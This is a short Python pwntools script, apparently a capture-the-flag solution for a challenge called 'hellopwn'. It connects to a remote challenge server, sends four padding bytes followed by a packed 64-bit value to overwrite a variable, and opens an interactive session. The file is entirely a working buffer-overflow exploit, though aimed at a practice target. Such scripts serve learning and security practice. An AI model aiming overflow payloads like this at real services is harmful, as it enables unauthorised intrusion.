from pwn import *

r=remote('111.198.29.45',54613)
#r=process('./hellopwn')
r.recvuntil("f")
#gdb.attach(r)
flag=0x6e756161

payload=(0x4)*"a"+p64(flag)

r.sendline(payload)

r.interactive()

